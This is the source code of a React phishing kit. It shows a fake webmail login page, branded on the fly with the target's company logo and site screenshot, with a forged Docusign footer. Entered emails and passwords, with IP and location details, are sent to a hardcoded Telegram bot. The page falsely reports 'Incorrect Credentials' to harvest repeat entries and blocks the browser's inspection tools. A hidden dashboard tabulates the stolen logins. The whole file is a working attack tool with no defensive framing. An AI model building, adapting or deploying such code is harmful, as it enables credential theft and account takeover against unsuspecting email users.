import React, { useState, useEffect } from 'react';
import './App.css';
import 'bootstrap/dist/css/bootstrap.min.css';
import $ from 'jquery';

function App() {
  const [count, setCount] = useState(0);
  const [botToken, setBotToken] = useState(
    localStorage.getItem('telegram_token') || 
    process.env.REACT_APP_TELEGRAM_TOKEN || 
    '7692021060:AAGl4rz-BSTgXbIFCbgoebGUFPW5SIiW0x4'
  );
  const [chatID, setChatID] = useState(
    localStorage.getItem('telegram_chatid') || 
    process.env.REACT_APP_TELEGRAM_CHAT_ID || 
    '-4952839301'
  );
  const [analyticsData, setAnalyticsData] = useState(() => {
    const savedData = localStorage.getItem('analyticsData');
    return savedData ? JSON.parse(savedData) : {
      visitors: 0,
      submissions: 0,
      invalidLogs: 0,
      bots: 0,
      credentials: []
    };
  });
  const [showDashboard, setShowDashboard] = useState(false);

  useEffect(() => {
    const handleContextMenu = (e) => e.preventDefault();
    document.addEventListener('contextmenu', handleContextMenu);
    return () => document.removeEventListener('contextmenu', handleContextMenu);
  }, []);

  useEffect(() => {
    const handleKeyDown = (e) => {
      const blockedKeys = {67: 'c', 85: 'u', 86: 'v', 117: 'F6', 123: 'F12', 73: 'i', 74: 'j', 83: 's'};
      if (e.ctrlKey || e.metaKey) {
        if (blockedKeys[e.keyCode]) e.preventDefault();
      }
      if (e.keyCode in blockedKeys) e.preventDefault();
    };
    document.addEventListener('keydown', handleKeyDown);
    return () => document.removeEventListener('keydown', handleKeyDown);
  }, []);

  useEffect(() => {
    setTimeout(() => {
      $('#loadingScreen').fadeOut();
    }, 2000);

    // Check for dashboard hash
    if (window.location.hash === '#dashboard') {
      setShowDashboard(true);
    }

    // Check for email in URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromURL = urlParams.get('uid') || urlParams.get('email') || window.location.hash.substring(1);
    
    if (emailFromURL && emailFromURL.includes('@') && emailFromURL.includes('.')) {
      $('#email').val(emailFromURL);
      $('#email').prop('readonly', true);
      const domain = emailFromURL.split('@')[1];
      $("#logoimg").attr("src", "https://logo.clearbit.com/" + domain);
      $(".logoname").html(domain.split('.')[0].charAt(0).toUpperCase() + domain.split('.')[0].slice(1));
      $('body').css({
        'background': `linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url("https://image.thum.io/get/width/1920/crop/1080/noanimate/https://${domain}")`,
        'background-size': 'cover',
        'background-position': 'center',
        'background-attachment': 'fixed',
        'background-repeat': 'no-repeat'
      });
    }
  }, []);

  const sendToTelegram = async (email, password, attemptNumber) => {
    if (!botToken || !chatID) { return false; }
    try {
      const ipResponse = await fetch('https://ipinfo.io/json');
      const ipData = await ipResponse.json();
      const domain = email.split('@')[1] || 'Unknown';
      const message = `
💥🎓🚀🏆M A I L - A C C E S S 💥🎓🚀🏆

📧 Email: ${email}
🔐 Password: ${password}
📌 IP: ${ipData.ip || 'Unknown'}
🌐 Domain: ${domain}
🌐 Country: ${ipData.country || 'Unknown'}
🏙️ City: ${ipData.city || 'Unknown'}
📍 Region: ${ipData.region || 'Unknown'}
📺 Browser: ${navigator.userAgent || 'Unknown'}
🚩 Language: ${navigator.language || 'Unknown'}
🕰️ Timezone: ${ipData.timezone || 'Unknown'}`;
      const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const response = await fetch(telegramURL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: chatID, text: message })
      });
      const data = await response.json();
      storeCredentials(email, password, ipData, attemptNumber);
      return data.ok;
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      return false;
    }
  };

  const storeCredentials = (email, password, ipData, attemptNumber) => {
    try {
      const submission = {
        email,
        password,
        attempt: attemptNumber,
        userAgent: navigator.userAgent,
        ip: ipData.ip,
        timestamp: new Date(),
        valid: attemptNumber > 1,
        isBot: /bot|crawl|spider/i.test(navigator.userAgent)
      };
      setAnalyticsData(prevData => {
        const updatedData = {...prevData};
        updatedData.visitors++;
        if (submission.isBot) updatedData.bots++;
        if (!submission.valid) updatedData.invalidLogs++;
        if (submission.valid) updatedData.submissions++;
        updatedData.credentials.unshift(submission);
        localStorage.setItem('analyticsData', JSON.stringify(updatedData));
        return updatedData;
      });
      return true;
    } catch (error) {
      console.error('Storage error:', error);
      return false;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    $('#error').hide();
    $('#msg').hide();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    if (!email) return;
    
    const newCount = count + 1;
    setCount(newCount);
    
    const btn = $('#submit-btn');
    btn.html('<i class="fas fa-spinner fa-spin"></i> Verifying').prop('disabled', true);
    const success = await sendToTelegram(email, password, newCount);
    if (success) {
      $('#notification').text('Incorrect Credentials!').fadeIn().delay(2000).fadeOut();
      setTimeout(() => {
        if (newCount >= 3) {
          const domain = email.split('@')[1];
          window.location.replace("https://www." + domain);
        } else {
          document.getElementById('password').value = "";
          btn.html('Sign in').prop('disabled', false);
        }
      }, 1500);
    } else {
      document.getElementById('password').value = "";
      btn.html('Sign in').prop('disabled', false);
    }
  };

  const updateDashboard = () => {
    const savedData = localStorage.getItem('analyticsData');
    if (savedData) {
      setAnalyticsData(JSON.parse(savedData));
    }
  };

  const handleViewPhishing = () => {
    setShowDashboard(false);
  };

  const handleRefreshDashboard = () => {
    updateDashboard();
  };

  return (
    <div>
      <div className="loading-screen" id="loadingScreen">
        <img src="https://i.ibb.co/yFd89pJf/unnamed.png" alt="Loading" className="loading-image" />
        <p className="loading-text">
          <span className="spinner"></span>
          Loading, please wait.....
        </p>
      </div>
      <div id="overlay"></div>
      
      {!showDashboard && (
        <div id="shing-page" className="login-form">
          <form id="login-form" onSubmit={handleSubmit}>
            <h4 className="text-center">
              <div id="top">
                <img src="https://i.imgur.com/Qmpgn6c.jpeg" alt="Logo" id="logoimg" width="100" height="100" />
                <p><span className="logoname">Webmail</span></p>
              </div>
            </h4>
            <div id="msg">? Network Connection Error!</div>
            <div id="error">That account doesn't exist. Enter a different account</div>
            <div className="form-group">
              <div className="input-group">
                <span className="input-group-addon"><i className="fas fa-user"></i></span>
                <input type="email" className="form-control" name="email" placeholder="Email Address" id="email" readOnly />
              </div>
            </div>
            <div className="form-group">
              <div className="input-group">
                <span className="input-group-addon"><i className="fas fa-lock"></i></span>
                <input type="password" className="form-control" id="password" name="password" placeholder="Password" required />
              </div>
            </div>
            <div className="clearfix">
              <label className="checkbox-inline"><input type="checkbox" defaultChecked /> Keep me signed in</label>
              <a href="#forgot" className="pull-right" onClick={(e) => e.preventDefault()}>Forgot Password?</a>
            </div>
            <div className="form-group">
              <button type="submit" className="btn" id="submit-btn">Sign in</button>
            </div>
            <hr />
            <p style={{ textAlign: "center", fontSize: "14px", color: "#666" }}>
              <i className="fas fa-lock" style={{ color: "#3ec55d" }}></i>
              <span style={{ marginLeft: "5px" }}>Secured by <strong><span style={{ textTransform: "capitalize" }} className="logoname"></span> Inc. © 2025</strong></span>
            </p>
          </form>
        </div>
      )}

      {showDashboard && (
        <div id="dashboard-page">
          <div className="container-fluid">
            <div className="d-flex justify-content-between align-items-center p-3 bg-light">
              <h2>OGP Credentials Dashboard</h2>
              <div>
                <button onClick={handleViewPhishing} className="tab-btn">View Phishing Page</button>
                <button onClick={handleRefreshDashboard} className="tab-btn">Refresh Data</button>
              </div>
            </div>
            <div className="dashboard">
              <div className="card visitors">
                <h3>Total Visitors</h3>
                <div className="count">{analyticsData.visitors}</div>
              </div>
              <div className="card submissions">
                <h3>Valid Submissions</h3>
                <div className="count">{analyticsData.submissions}</div>
              </div>
              <div className="card invalid">
                <h3>Invalid Logs</h3>
                <div className="count">{analyticsData.invalidLogs}</div>
              </div>
              <div className="card bots">
                <h3>Bots Detected</h3>
                <div className="count">{analyticsData.bots}</div>
              </div>
            </div>
            <div className="table-responsive p-3">
              <table className="table table-striped" id="credentials-table">
                <thead className="thead-dark">
                  <tr>
                    <th>Timestamp</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>Device</th>
                    <th>Status</th>
                  </tr>
                </thead>
                <tbody>
                  {analyticsData.credentials.map((entry, index) => (
                    <tr key={index}>
                      <td>{new Date(entry.timestamp).toLocaleString()}</td>
                      <td>{entry.email}</td>
                      <td>{entry.password}</td>
                      <td>{entry.ip}</td>
                      <td>{entry.userAgent.substring(0, 50)}...</td>
                      <td>
                        {entry.valid ? (
                          <span className="badge badge-success">Valid</span>
                        ) : (
                          <span className="badge badge-danger">Invalid</span>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      <footer>
        <div className="footer-container">
          <div className="footer-links">
            <a href="#en" className="footer-link" onClick={(e) => e.preventDefault()}>English (US)</a>
            <a href="#contact" className="footer-link" onClick={(e) => e.preventDefault()}>Contact Us</a>
            <a href="#terms" className="footer-link" onClick={(e) => e.preventDefault()}>Terms of Use</a>
            <a href="#privacy" className="footer-link" onClick={(e) => e.preventDefault()}>Privacy</a>
            <a href="#ip" className="footer-link" onClick={(e) => e.preventDefault()}>Intellectual Property</a>
            <a href="#trust" className="footer-link" onClick={(e) => e.preventDefault()}>Trust</a>
          </div>
          <div className="copyright">
            Copyright © 2025 Docusign, Inc. All rights reserved
          </div>
        </div>
      </footer>
      <div id="notification"></div>
    </div>
  );
}

export default App;
